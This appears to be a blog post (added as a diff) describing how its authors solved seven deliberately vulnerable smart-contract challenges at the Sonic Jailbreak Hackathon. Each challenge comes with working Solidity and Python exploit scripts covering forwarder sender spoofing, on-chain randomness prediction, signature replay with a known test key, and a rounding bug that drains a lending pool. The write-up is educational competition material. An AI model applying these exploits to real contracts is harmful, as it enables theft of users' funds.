@@ -1,0 +1,879 @@
+---
+title: Sonic Jailbreak Hackathon – Writeup
+date: '2025-07-19'
+draft: false
+authors: ['snwo', 'sahuang']
+tags: ['Blockchain', 'Sonic Jailbreak Hackathon', 'Web3', 'solidity']
+summary: 'We were the only team to solve all challenges at the Sonic Jailbreak Hackathon Dev Track, claiming $15K in prizes.'
+canonicalUrl: 'https://blog.solidity.kr/posts/(ctf)-sonic-jailbreak-hackathon/'
+---
+
+I played Sonic Summit Jailbreak Hackathon 2025 with my teammate [Y4nhu1](https://sekai.team/members/yanhu). The Hackathon consists of two distinct tracks — users and developers — compete simultaneously to drain a prize pot of over 55,000 \$S secured in a smart contract. In developer track, developers must identify and exploit a deliberate vulnerability embedded by Cantina in the prize pot smart contract.
+
+- **Mechanics**: Developers analyze provided smart contract code, aiming to discover an exploit or vulnerability that will allow them to drain assets held in the smart contract.
+- **Challenge**: Technical expertise and rapid problem-solving to uncover the vulnerability.
+- **Win Condition**: Demonstrate the ability to drain the prize pot and claim funds through a verification process on Cantina.
+
+We ended up with the only team that completed all challenges, and received half of the prizes (around 27,500 \$S tokens). The interesting part was [pot contract](https://sonicscan.org/address/0x38dd721dFd51FdEe02e6641e0CE0d5872aDB90B1). After solving each challenge, the challenge contract calls `addPoints` function in pot contract, and when a user reaches 200 points, they can call the `claimWin` function to get an NFT token. But that doesn’t mean we can withdraw the prize :D (We received the prize after a month when $S halved😔)
+
+You can check the hackathon information & challenges here:
+- [Sonic Summit Jailbreak Hackathon 2025: Users vs Developers](https://blog.soniclabs.com/sonic-summit-jailbreak-hackathon-2025-users-vs-developers/)
+- [Dev Track Challenges on GitHub](https://github.com/cantinasec/vienna_hackathon_2025)
+
+All the transaction hashes can be found in [sonicscan.org](https://sonicscan.org/). Overall, this was a fun contest with interesting mechanisms for claiming prizes. Below are brief writeups for all the challenges. (Note: This excludes one challenge which was basically unsolvable by player. Solving other 7 challenges with first bloods successfully gained us 200 points required.)
+
+## Eu Tu, Proxy?
+
+> Fiona Fox was on her way to discovering a magical proxy implementation. She stumbled upon a hidden function with a signature broad enough to allow the new owner of the proxy to be set, ideally enabling her to steal all the winning points.
+> 
+> She concealed the secret function signature and asked her friend Knuckles to guess it. Knuckles began by guessing: transferOwnership, transferOwner, updateOwner, ....
+> 
+> Total Points: 10 + (1 first blood bonus)
+> 
+> [Challenge Link](https://github.com/cantinasec/vienna_hackathon_2025/tree/main/EU_TU_PROXY)
+
+Transaction hash: `0x5bcd073052cfaafda0b38ee976d6612f937c967112651cbc9510b8203eabfc6e`, `0xf1f8616a6ac71d852d17d82f63fd943760d3e88b1f82e6c76909c03c78d8c015`.
+
+### Solution
+
+Find the [contract bytecode](https://sonicscan.org/address/0xb73e7da3fa04a37bbe6be13ca4f1ec68b82a8a26#code) and feed it into [bytegraph](https://bytegraph.xyz/bytecode/fe3a91f69e05d65559ab1cfe08f58bcb/graph) (The link may expire).
+
+The `slot 1` address has code that sets the `slot 2` to calldata, so using fallback to delecatecall `slot 1` address, set `slot 2` to my address and call  `_0x57c1669d` to claim the points.
+    
+```js
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import {Script, console} from "forge-std/Script.sol";
+
+import {ChallengeEasy4} from "../vienna_hackathon_2025/EU_TU_PROXY/Challenge_Easy_4.sol";
+
+contract Easy4Script is Script {
+
+    function run() public {
+        vm.startBroadcast();
+        address player = vm.envAddress("PLAYER");
+        address chall = 0xb73E7da3fA04A37bbE6be13CA4f1eC68b82a8A26;
+
+        (bool success, bytes memory data) = address(chall).call(abi.encodePacked(uint256(uint160(player))));
+        console.log("success", success);
+
+        ChallengeEasy4(payable(chall))._0x57c1669d();
+
+        vm.stopBroadcast();
+    }
+}
+```
+
+## MIGHTY’s IDENTITY CRISIS
+
+> Mighty has developed the ultimate identity verification system! He’s so confident that only smart contracts can call his function that he’s put his challenge points behind it. But wait... something feels off.
+> 
+> Get past Mighty’s identity check. Are you clever enough to outsmart his verification system? Remember, in the world of smart contracts, nothing is quite what it seems!
+> 
+> Total Points: 10 + (1 first blood bonus)
+> 
+> [Challenge Link](https://github.com/cantinasec/vienna_hackathon_2025/tree/main/MIGHTY'S_IDENTITY_CRISIS)
+
+Transaction hash: `0x15229302aaf7f9f7d1f4473342985ca951829fbcbd56f7129fd2c86c2af78bec`
+
+### Solution
+
+`onlyContract()` checks the `msg.sender`, while `_msgSender()` that is passed to the `pot.addPoints()` can be set by the forwarder. Use the forwarder to call `solve()`, the forwarder can pass the `onlyContract` check, while the player gets the point.
+
+```js
+import "@openzeppelin/contracts/metatx/ERC2771Forwarder.sol";
+import "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
+
+contract Easy1Script is Script {
+
+    function run() public {
+        vm.startBroadcast();
+        address player = vm.envAddress("PLAYER");
+        uint256 priv = vm.envUint("PLAYER_PRIV_KEY");
+
+        address chall = 0x1237B533A88612E27aE447f7D84aa7Eb6722e39D;
+        ERC2771Forwarder forwarder = ERC2771Forwarder(0x141Fb23a7087ebb9858FEDC320DE5371C7e84cA2);
+
+        ERC2771Forwarder.ForwardRequestData memory req = ERC2771Forwarder.ForwardRequestData(
+            player, // from
+            address(chall),   // to
+            0,  // value
+            300000, // gas
+            uint48(block.timestamp + 1 minutes),  // deadline
+            abi.encodeWithSignature("solve()"),
+            new bytes(0) // signature
+        );
+
+        bytes32 separator = keccak256(
+            abi.encode(
+                keccak256(
+                    "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"
+                ),
+                keccak256(bytes("Forwarder")),
+                keccak256(bytes("1")),
+                146,
+                address(forwarder)
+            )
+        );
+        bytes32 forwarderTypeHash = keccak256(
+            "ForwardRequest(address from,address to,uint256 value,uint256 gas,uint256 nonce,uint48 deadline,bytes data)"
+        );
+        bytes32 digest = MessageHashUtils.toTypedDataHash(
+            separator,
+            keccak256(
+                abi.encode(
+                    forwarderTypeHash,
+                    req.from,
+                    req.to,
+                    req.value,
+                    req.gas,
+                    0,
+                    req.deadline,
+                    keccak256(req.data)
+                )
+            )
+        );
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(priv, digest);
+        bytes memory signature = abi.encodePacked(r, s, v);
+        req.signature = signature;
+
+        forwarder.execute(req);
+
+        vm.stopBroadcast();
+    }
+}
+```
+
+## FANG’s POWER-BALL PARADISE
+
+> Fang’s gone and created his own lottery system, and he’s ABSOLUTELY CERTAIN it’s fair and square! After all, who can predict the blockchain’s randomness, right? RIGHT?!
+> 
+> Total Points: 10 + (1 first blood bonus)
+> 
+> [Challenge Link](https://github.com/cantinasec/vienna_hackathon_2025/tree/main/FANG'S_POWERBALL_PARADISE)
+
+Transaction hashes:
+
+```
+0x01c8ee047215fd44153b123865621321dc0bcd821eb13510da7624675200cba6
+0x9bd6f3b4780c7d1177a35e52c32da3b72e162f9098a6f8a0bb1530c39bdc8e47
+0x7c6729492af2227806d068f9833be62b56786e9563a7161c96ae20a876b39f05
+0x9b8540cfdbb807b9be11c96bcdbdc1d60de79a1e9f9fb02255fa758792960b8a
+0xa7b0eaa90e6382c7faea7d5b990a6a3fb759fbeb47fd3398a4ffdddd0fce1588
+0xce3210bc8911c49c247f9c91d97b4e762387ce98a2a2c0fa074df06aadb755cf
+0x459aafa8ad62d29f6e0f010ec132245e1322650033d19388641131d232e19cb8
+0xc0fe24a8c215e37189e6c429c162aa0ffba0225b532a71f5e41236bb1d05c749
+0xb9a49731f81510a690a21881ba0a5412c749cb6f45dcadaa395965947281add1
+0x63e2612b8a5451b400579ccc3b39ea4bd746e1b3dd80174a4148aacb3ee9813f
+0x542eb5c6f43f0175133ef83e02bbe770cc3d1ea26ae00133d80205d84f5a9f1c
+```
+
+### Solution
+
+Contracts in the same block use the same `block.prevrandao`. Based on the use of the forwarder in `Easy 1`, use a helper function to determine whether to call the challenge contract based on the random result.
+    
+```js
+contract Helper {
+    bytes32 constant separator = 0xb0b9bfbe3cefbfdc6d6872e4aff4cb89d1b82df01a5fc1446178b784a19efd3c;
+    bytes32 constant forwarderTypeHash = 0x7f96328b83274ebc7c1cf4f7a3abda602b51a78b7fa1d86a2ce353d75e587cac;
+    ERC2771Forwarder public forwarder;
+
+    constructor(ERC2771Forwarder _forwarder) {
+        forwarder = _forwarder;
+    }
+
+    function getHash(address from, address to, uint nonce, uint48 deadline, bytes calldata data) public view returns (bytes32) {
+        return MessageHashUtils.toTypedDataHash(
+            separator,
+            keccak256(
+                abi.encode(
+                    forwarderTypeHash,
+                    from,
+                    to,
+                    0,
+                    300000,
+                    nonce,
+                    deadline,
+                    keccak256(data)
+                )
+            )
+        );
+    }
+
+    function helpCall(ERC2771Forwarder.ForwardRequestData memory req, uint256 guess) public {
+        if (block.prevrandao % 26 == guess) {
+            forwarder.execute(req);
+            return;
+        }
+        revert("Not matched");
+    }
+}
+```
+
+```python
+from cheb3 import Connection
+from cheb3.utils import load_compiled, encode_with_signature
+from eth_account import Account
+
+from datetime import datetime, timezone
+
+conn = Connection("https://rpc.soniclabs.com/")
+account = conn.account("<pk>")
+challenge = "0x786BeE5292B12AA79725cb66f0CBfb7E10A6CAc9"
+forwarder_addr = "0xEC83A9D2a4D1fbd20b062297a1996F17803Ee4A4"
+
+helper_abi, helper_bin = load_compiled("PoC.t.sol", "Helper")
+helper = conn.contract(account, abi=helper_abi, bytecode=helper_bin)
+helper.deploy(forwarder_addr)
+
+forwarder_abi, _ = load_compiled("ERC2771Forwarder.sol")
+forwarder = conn.contract(account, abi=forwarder_abi, address=forwarder_addr)
+
+nonce = 0
+
+def sign(f, to, deadline, d):
+    global nonce
+    digest = helper.caller.getHash(
+        f,
+        to,
+        nonce,
+        deadline,
+        d
+    )
+    sig = Account._sign_hash(digest, account.private_key).signature
+    return sig
+
+def sign_and_execute(f, to, t, d):
+    global nonce
+    deadline = int(datetime.now(timezone.utc).timestamp()) + t
+    sig = sign(f, to, deadline, d)
+    forwarder.functions.execute(
+        (f, to, 0, 300000, deadline, d, sig)
+    ).send_transaction()
+    nonce += 1
+
+for i in range(5):
+    sign_and_execute(
+        account.address,
+        challenge,
+        60,
+        encode_with_signature(
+            "start(uint256)",
+            3
+        )
+    )
+
+    deadline = int(datetime.now(timezone.utc).timestamp()) + 600
+    sig = sign(account.address, challenge, deadline, encode_with_signature("solve()"))
+    print(f"deadline: {deadline}")
+    print(f"sig: {sig.hex()}")
+    nonce += 1
+    while True:
+        try:
+            helper.functions.helpCall(
+                (account.address, challenge, 0, 300000, deadline, encode_with_signature("solve()"), sig), 3
+            ).send_transaction()
+            break
+        except Exception as e:
+            print(e)
+            pass
+    
+    print(conn.cast_call(challenge, "winnings(address)(uint256)", account.address))
+```
+
+## Fang’s venom
+
+> Fang believes the world is filled with hidden dangers. The smart contracts environment, which has malicious actors lurking everywhere, is also impacted. However, the magic hash issue stems from internal constraints closely tied to the challenge address.
+> 
+> Crack the hash, help Fang gain his inner peace.
+> 
+> Total Points: 30 + (3 first blood bonus)
+> 
+> [Challenge Link](https://github.com/cantinasec/vienna_hackathon_2025/tree/main/FANG'S_VENOM)
+
+Transaction hash: `0x84758cfe94c3f8227d132fbcc616293043946049f1ef9088768c33358080bdc3`
+
+### Solution
+
+The `imadeadbeef` function requires two parameters, it concats two params and hash, then compares with value at storage 4 (`0x98de0bff1fd1afdd3978d3dc3a57fc8af4b4d05ca4d23f4ec3593c0276ce0eb9`). This challenge involved a LOT of guess work, and we tried different brute-force scripts, but none was working. Eventually, we figured out `codehash` and `codesize` were the correct answers.
+
+```js
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import {Script, console} from "forge-std/Script.sol";
+// import {Vyper} from "./Vyper.sol";
+import {ChallengeMedium2} from "../vienna_hackathon_2025/FANG'S_VENOM/Challenge_Medium_2.sol";
+
+contract Medium2 is Script {
+    address private deployer = 0x7b7DC09643302549d633b45c901B9051E2354388;
+    function run() public {
+        vm.startBroadcast();
+
+        ChallengeMedium2 chall = ChallengeMedium2(payable(0x8919B92F52bb8C1aF7C9AFeE2Bdd179d3272919e));
+
+        bytes32 a = 0x55cbd873780b8e356293a84679964e6f57000d1486874bf0a39aeba0a5715cd4;
+        uint256 b = 0xd1b;
+
+        chall.imadeadbeef(a,b);
+
+        vm.stopBroadcast();
+    }
+}
+```
+
+## Metal Knuckle’s Permissions
+
+> Knuckle's code auditors warned him about his code's lack of re-entrancy protections. Shattered Knuckles added more reentrant locks and made the code available for the elite CTFers to verify whether it was still vulnerable.
+> 
+> Total Points: 30 + (3 first blood bonus)
+> 
+> [Challenge Link](https://github.com/cantinasec/vienna_hackathon_2025/tree/main/METAL_KNUCKLE'S_PERMISSION)
+
+Transaction hash: `0xf6e08f017f68efd3ab95c98628f6d404a61cfad69ba51eb7d81739eb710f1ccb`
+
+### Solution
+
+We searched `0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266` address on Google, and found a private key from StackExchange [Hardhat local network keys generation](https://ethereum.stackexchange.com/questions/94886/hardhat-local-network-keys-generation). We could sign arbitrary message and send the same signed messages in `multisig` function to solve.
+
+```js
+contract MetalKnuckle is Script {
+    function run() public {
+        vm.startBroadcast();
+        address deploy = 0x6Dd509F963820F3950A56E3C0ABECdF8b3e92434;
+        address addr = 0x702105690fCbfC7588254bA71f0EEA60663c2534;
+        address signer = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
+        uint256 signer_private_key = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
+        bytes32 message = keccak256(abi.encodePacked(bytes32(uint256(uint160(signer))), bytes32(uint256(uint160(addr)))));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signer_private_key, message);
+        IPermitToReenter.Sig[] memory sig = new IPermitToReenter.Sig[](3);
+        sig[0] = IPermitToReenter.Sig({_index: 1, hashed: message, v: v, r: r, s: s});
+        sig[1] = IPermitToReenter.Sig({_index: 1, hashed: message, v: v, r: r, s: s});
+        sig[2] = IPermitToReenter.Sig({_index: 1, hashed: message, v: v, r: r, s: s});
+        IPermitToReenter(deploy).multisig(sig);
+        vm.stopBroadcast();
+    }
+}
+```
+
+## Vector’s 3-Bit Surfer Island
+
+> You control a surfer navigating through procedurally generated tracks by Vector filled with walls, blocks, and wires. With 84 positions to traverse and only specific actions available, every move counts:
+> 
+> - TRACK_UP/TRACK_DOWN: Switch lanes to avoid obstacles
+> - JUMP: Leap over blocks when you can’t go around
+> - DODGE: Slide under wires when there’s no other way
+> - NONE: Stay in your lane and hope for the best
+> 
+> Total Points: 50 + (5 first blood bonus)
+> 
+> [Challenge Link](https://github.com/cantinasec/vienna_hackathon_2025/tree/main/VECTOR'S_3BIT_SURFER_ISLAND)
+
+Transaction hash: `0x68bb55ae163d192fe9d65e8dfafc91b3c6d9ac3d9b668661419dcf389a41031b`
+
+### Solution
+
+Convert Huff code to Python after analysis, get a valid seed that generates solvable maze with several attempts and solve maze with dfs.
+
+```js
+import {Script} from "forge-std/Script.sol";
+import {console} from "forge-std/console.sol";
+contract Hard2Script is Script {
+
+    function run() public {
+        vm.startBroadcast();
+
+        address chall = 0x4328B9410575a383349F2e88644C933F91c6A5C6;
+
+        bytes memory data = abi.encodePacked(
+            bytes4(hex"00000000"),
+            uint256(27684352554021427800379120908796796058859940284427164423451880434819558757544),
+            uint256(43736918673050163201934668174654671028240)
+        );
+
+        (bool success, bytes memory result) = chall.call(data);
+        require(success, "Call failed");
+
+        console.logBytes(result);
+
+        vm.stopBroadcast();
+    }
+}
+```
+
+```python
+from eth_hash.auto import keccak
+from eth_utils import to_bytes, int_to_big_endian
+
+# Constants from Core.huff
+ACTION_NONE = 0x0    # keep current lane, no vertical move
+ACTION_UP = 0x1      # move to lane above (index-1)
+ACTION_DOWN = 0x2    # move to lane below (index+1)
+ACTION_JUMP = 0x3    # jump over a ROCK
+ACTION_DODGE = 0x4   # slide under a WIRE
+
+LANE_EMPTY = 0x0
+LANE_WALL = 0x1
+LANE_ROCK = 0x2
+LANE_WIRE = 0x3
+
+# Constants from Main.huff
+POT_ADDRESS = 0x1234567890abcdef1234567890abcdef12345678
+ADDPOINTS_SELECTOR = 0xad7b985e
+# SEED = 0x51716105bf233e10fe12591e77e79e0718d782d0de6dcc5bf0a6b49c625b6690
+def _get_front_obstacle(current_lane, lanes):
+    """Get obstacle in the current lane from lanes bitmap"""
+    if current_lane == 0x1:
+        return (lanes & 0x7)
+    elif current_lane == 0x2:
+        return ((lanes >> 3) & 0x7)
+    elif current_lane == 0x3:
+        return ((lanes >> 6) & 0x7)
+    return 0
+
+def decode_obstacle(pos, seed):
+    """Extract obstacle code at a given position from seed"""
+    mask = 0x7 << (3 * pos)
+    return (seed & mask) >> (3 * pos)
+
+def encode_obstacle(code):
+    """Encode obstacle code into lanes bitmap"""
+    lanemask = (0x862311 >> (code*3)) & 0x7
+    value = code//3 + 1
+    lane1 = (lanemask & 1) * value
+    lane2 = ((lanemask >> 1) & 1) * value
+    lane3 = ((lanemask >> 2) & 1) * value
+    return lane1 | (lane2 << 3) | (lane3 << 6)
+
+def build_lane(pos, seed):
+    """Build lane from position and seed"""
+    obstacle = decode_obstacle(pos, seed)
+    return encode_obstacle(obstacle)
+
+def join_lane(offset, lanes_b, lanes_a):
+    """Join two lane bitmaps based on offset"""
+    mask = 0x7 << offset
+    a_masked = lanes_a & mask
+    b_masked = lanes_b & mask
+    a_shifted = a_masked >> offset
+    b_shifted = b_masked >> offset
+    return select(b_shifted, a_shifted)
+
+def select(b, a):
+    """Select between two values based on if a is zero"""
+    mask = 1 if a == 0 else 0
+    return (b * mask) + (a * (1 - mask))
+
+def build_tracks(pos, seed_b, seed_a):
+    """Build combined tracks from seeds"""
+    lanes_b = build_lane(pos, seed_b)
+    lanes_a = build_lane(pos, seed_a)
+    
+    lane1 = select(lanes_b & 0x7, lanes_a & 0x7)
+    lane3 = join_lane(0x6, lanes_b, lanes_a)
+    lane2 = join_lane(0x3, lanes_b, lanes_a)
+    
+    return lane1 | (lane2 << 3) | (lane3 << 6)
+
+def get_action(pos, actions):
+    """Get action for the current position"""
+    mask = 0x7 << (pos * 3)
+    return ((actions & mask) >> (pos * 3)) & 0x7
+
+def get_seeds(seed):
+    """Generate two seeds from input seed"""
+    seed = hex(seed)
+    sender_as_int = 0x702105690fCbfC7588254bA71f0EEA60663c2534
+    packed_data = int_to_big_endian(sender_as_int).rjust(32, b'\0') + to_bytes(hexstr=seed)
+    seed_a = '0x' + keccak(packed_data).hex()
+    seed_b = '0x' + keccak(to_bytes(hexstr=seed_a)).hex()
+    print(seed_a)
+    print(seed_b)
+    seed_a = int(seed_a, 16)
+    seed_b = int(seed_b, 16)
+    return seed_b, seed_a
+
+def update_current_lane(user_action, current_lane):
+    """Update player's current lane based on action"""
+    lane_change = 0
+    if user_action == ACTION_UP:
+        lane_change = -1
+    elif user_action == ACTION_DOWN:
+        lane_change = 1
+    
+    new_lane = current_lane + lane_change
+    
+    # Validate lane bounds (1-3)
+    if not (0 < new_lane <= 3):
+        raise ValueError("Invalid lane position")
+    
+    return new_lane
+
+def validate_move(user_action, obstacle):
+    """Validate if move is valid against obstacle"""
+    # Can't move into a wall
+    if obstacle == LANE_WALL:
+        raise ValueError("Cannot move into a wall")
+    
+    # Must jump over rocks
+    if obstacle == LANE_ROCK and user_action != ACTION_JUMP:
+        raise ValueError("Must jump over rocks")
+    
+    # Must dodge under wires
+    if obstacle == LANE_WIRE and user_action != ACTION_DODGE:
+        raise ValueError("Must dodge under wires")
+
+def solve_position(current_lane, action, lanes):
+    """Solve one position update"""
+    new_lane = update_current_lane(action, current_lane)
+    obstacle = _get_front_obstacle(new_lane, lanes)
+    validate_move(action, obstacle)
+    return new_lane
+
+def solve(actions, seed_b, seed_a, pos, current_lane):
+    """Solve game state for one step"""
+    action = get_action(pos, actions)
+    new_pos = pos + 1
+    lanes = build_tracks(pos, seed_b, seed_a)
+    new_lane = solve_position(current_lane, action, lanes)
+    return actions, seed_b, seed_a, new_pos, new_lane
+
+def get_obstacle_decompressed(obstacle):
+    """Decompress obstacle into individual lanes"""
+    lanes = encode_obstacle(obstacle)
+    lane1 = lanes & 0x7
+    lane2 = (lanes >> 3) & 0x7
+    lane3 = (lanes >> 6) & 0x7
+    return lane3, lane2, lane1
+
+def add_points(caller_address):
+    """Call contract to add points (simulated)"""
+    # This would normally make an external contract call
+    print(f"Adding points for {caller_address}")
+    return True
+
+def main(seed, actions):
+    """Main function that processes the entire game"""
+    seed_b, seed_a = get_seeds(seed)
+    pos = 0
+    current_lane = 2  # Start in the middle lane
+    
+    # Loop until we reach position 48
+    while pos < 48:
+        actions, seed_b, seed_a, pos, current_lane = solve(actions, seed_b, seed_a, pos, current_lane)
+    
+    # Add points when complete
+    caller_address = "0xYourAddressHere"  # This would normally be msg.sender
+    add_points(caller_address)
+    
+    return True
+
+import random
+import hashlib
+
+# Add this function to visualize the game
+def visualize_game(seed, actions=None):
+    """Generate and visualize a random game track"""
+    if actions is None:
+        # Generate empty actions (all 0s)
+        actions = 0
+    
+    seed_b, seed_a = get_seeds(seed)
+    
+    # Display header
+    print("=" * 50)
+    print(f"Game with seed: {seed}")
+    print("=" * 50)
+    
+    # Symbol mapping
+    symbols = {
+        LANE_EMPTY: " ",  # Empty space
+        LANE_WALL: "█",   # Wall
+        LANE_ROCK: "O",   # Rock
+        LANE_WIRE: "~"    # Wire
+    }
+    
+    # Generate and display each position
+    current_lane = 2  # Start in middle lane
+    player_positions = []
+    
+    for pos in range(48):  # 48 positions total
+        lanes = build_tracks(pos, seed_b, seed_a)
+        
+        # Extract lane contents
+        lane1 = lanes & 0x7
+        lane2 = (lanes >> 3) & 0x7
+        lane3 = (lanes >> 6) & 0x7
+        
+        # Store information about the current position
+        if actions != 0:
+            action = get_action(pos, actions)
+            try:
+                # Simulate movement if actions are provided
+                current_lane = update_current_lane(action, current_lane)
+                obstacle = _get_front_obstacle(current_lane, lanes)
+                validate_move(action, obstacle)
+                player_positions.append((pos, current_lane))
+            except ValueError as e:
+                print(f"Game over at position {pos}: {e}")
+                break
+        
+        # Print the lanes
+        lane_display = [
+            f"Lane 1: {symbols[lane1]}",
+            f"Lane 2: {symbols[lane2]}",
+            f"Lane 3: {symbols[lane3]}"
+        ]
+        
+        # Add player marker if we're tracking actions
+        if actions != 0 and (pos, current_lane) in player_positions:
+            lane_display[current_lane-1] += " <Player>"
+            
+        print(f"Position {pos}:")
+        for lane in lane_display:
+            print(lane)
+        print()
+
+def generate_random_seed():
+    """Generate a random seed for the game"""
+
+    # return SEED
+    return 27684352554021427800379120908796796058859940284427164423451880434819558757544
+    return random.randint(0, 2**256 - 1)
+
+def visualize_compact(seed, length=48):
+    """Generate a more compact visualization of the game track"""
+    seed_b, seed_a = get_seeds(seed)
+    
+    # Symbol mapping
+    symbols = {
+        LANE_EMPTY: "·",  # Empty space
+        LANE_WALL: "█",   # Wall
+        LANE_ROCK: "O",   # Rock
+        LANE_WIRE: "~"    # Wire
+    }
+    
+    # Display header
+    print("=" * 50)
+    print(f"Game with seed: {seed}")
+    print("=" * 50)
+    
+    # Build the track visualization
+    track = [["" for _ in range(length)] for _ in range(3)]
+    
+    for pos in range(length):
+        lanes = build_tracks(pos, seed_b, seed_a)
+        
+        # Extract lane contents
+        track[0][pos] = symbols[lanes & 0x7]           # Lane 1
+        track[1][pos] = symbols[(lanes >> 3) & 0x7]    # Lane 2
+        track[2][pos] = symbols[(lanes >> 6) & 0x7]    # Lane 3
+    
+    # Print the track
+    print("Lane 1: " + "".join(track[0]))
+    print("Lane 2: " + "".join(track[1]))
+    print("Lane 3: " + "".join(track[2]))
+    print()
+
+def is_solvable(seed):
+    """Determine if the maze can be solved with the given seed"""
+    seed_b, seed_a = get_seeds(seed)
+    pos = 0
+    current_lane = 2  # Start in middle lane
+    
+    print("Checking if maze is solvable...")
+    
+    # Try to navigate through all positions
+    while pos < 48:
+        lanes = build_tracks(pos, seed_b, seed_a)
+        
+        # Try all possible actions
+        solvable_position = False
+        best_action = None
+        
+        for action in [ACTION_NONE, ACTION_UP, ACTION_DOWN, ACTION_JUMP, ACTION_DODGE]:
+            try:
+                new_lane = update_current_lane(action, current_lane)
+                obstacle = _get_front_obstacle(new_lane, lanes)
+                validate_move(action, obstacle)
+                
+                # Found a valid move
+                solvable_position = True
+                best_action = action
+                current_lane = new_lane
+                break
+            except ValueError:
+                continue
+        
+        if not solvable_position:
+            print(f"No valid move found at position {pos}")
+            return False
+        
+        # Move to next position
+        pos += 1
+    
+    print("Maze is solvable!")
+    return True
+
+def find_solution_dfs(seed):
+    """Find a solution for the maze using Depth-First Search"""
+    seed_b, seed_a = get_seeds(seed)
+    
+    def dfs(pos, current_lane, actions_so_far=0):
+        # If we reached the end, we've found a solution
+        if pos >= 48:
+            return actions_so_far
+        
+        # Get the current track layout
+        lanes = build_tracks(pos, seed_b, seed_a)
+        
+        # Try each possible action in order
+        for action in [ACTION_NONE, ACTION_UP, ACTION_DOWN, ACTION_JUMP, ACTION_DODGE]:
+            try:
+                # Check if this action is valid
+                new_lane = update_current_lane(action, current_lane)
+                obstacle = _get_front_obstacle(new_lane, lanes)
+                validate_move(action, obstacle)
+                
+                # Valid move found, add this action to our solution
+                new_actions = actions_so_far | (action << (pos * 3))
+                
+                # Explore this path further
+                result = dfs(pos + 1, new_lane, new_actions)
+                
+                # If we found a solution down this path, return it
+                if result is not None:
+                    return result
+                
+            except ValueError:
+                # Invalid move, try next action
+                continue
+        
+        # No solution found from this position
+        return None
+    
+    # Start DFS from position 0, middle lane
+    print("Searching for solution with DFS...")
+    solution = dfs(0, 2)
+    
+    if solution is not None:
+        print("Solution found!")
+        return solution
+    else:
+        print("No solution exists.")
+        return None
+
+def solution_to_action_array(solution):
+    """Convert a solution integer to an array of 3-bit action values"""
+    actions = []
+    
+    for pos in range(48):
+        # Extract the 3-bit action at this position
+        action = get_action(pos, solution)
+        actions.append(action)
+    
+    return actions
+
+def print_solution_as_array(solution):
+    """Print the solution as an array of actions with their names"""
+    global action_array
+    action_array = solution_to_action_array(solution)
+    
+    # Action name mapping
+    action_names = {
+        ACTION_NONE: "NONE",
+        ACTION_UP: "UP",
+        ACTION_DOWN: "DOWN",
+        ACTION_JUMP: "JUMP",
+        ACTION_DODGE: "DODGE"
+    }
+    
+    # Print array format
+    print("Solution as 3-bit action array:")
+    print("[", end="")
+    
+    for i, action in enumerate(action_array):
+        if i > 0:
+            print(", ", end="")
+        
+        # Print position, action value, and name
+        print(f"{action}", end="")
+    
+    print("]")
+    
+    # Print with action names for readability
+    print("\nSolution with action names:")
+    for pos, action in enumerate(action_array):
+        print(f"Position {pos}: {action} ({action_names.get(action, 'UNKNOWN')})")
+
+# Main script to generate and visualize a game
+if __name__ == "__main__":
+    # Generate a random seed
+    random_seed = generate_random_seed()
+    print(f"Generated random seed: {random_seed}")
+    
+    # Visualize the game in compact format
+    visualize_compact(random_seed)
+    
+    # Try to find a solution using DFS
+    solution = find_solution_dfs(random_seed)
+    
+    if solution:
+        print_solution_as_array(solution)
+        
+        # Convert solution to hex string with 0 padding
+        # Each byte can hold 2 full 3-bit actions (with 2 bits left over)
+        hex_bytes = []
+        for i in range(0, 48, 2):
+            if i + 1 < 48:
+                # Two full actions in one byte
+                byte_val = action_array[i] | (action_array[i+1] << 3)
+            else:
+                # Last action if odd number
+                byte_val = action_array[i]
+            hex_bytes.append(byte_val)
+        print(action_array)
+        bits = ""
+        for i in range(len(action_array)):
+            bits = format(action_array[i], '03b') + bits
+        print(bits)
+        # Format as hex bytes
+        hex_solution = '0x' + ''.join(f'{b:02x}' for b in hex_bytes)
+        print(f"Compact hex representation: {hex_solution}")
+    else:
+        print("No solution found. Maze is unsolvable.")
+```
+
+## Knuckle’s Lending Pool
+
+> Knuckle’s new lending protocol is impressive, allowing users to deposit native Sonic tokens as collateral and earn interest. With his unwavering belief in its potential, he has already invested his own tokens!
+> 
+> Yet, in the dynamic realm of DeFi, there’s always more beneath the surface. Can you spot any flaws in Knuckle’s pool and help him refine his vision?
+> 
+> Total Points: 50 + (5 first blood bonus)
+> 
+> [Challenge Link](https://github.com/cantinasec/vienna_hackathon_2025/tree/main/KNUCKLE'S_LENDING_POOL)
+
+Transaction hash: `0xff54c7887ecc944044798d87c0721b093f1062f63dee5c9e98af0820148ef8ef`, `0x0a4229073cffec2cf974f62af619478de5925056edeb8385e5510098d4ac3206`, `0xcd112332f54f7f14478966e64d7a4b2ffde7e24cfabf511619a96944bbff8f07`
+
+### Solution
+
+There is a precision loss in `vaultLib.calcAssetForWithdrawals()`. So, the amount required to burn will be much less than the metric’s deducted amount. In this case, after burning, the metric becomes zero, while the user still holds some tokens.
+
+```js
+contract Hard1Script is Script {
+
+    function run() public {
+        vm.startBroadcast();
+        
+        ChallengeHard1 chall = ChallengeHard1(payable(0x68283749b8933E57fdBCA021fcCa03bcfB539199));
+
+        chall.ingressLiquidity{value: 1 ether + 1000}();
+        chall.egressLiquidity(1 ether + 1000);
+        chall.verifySystemCompletion();
+
+        vm.stopBroadcast();
+    }
+}
+```
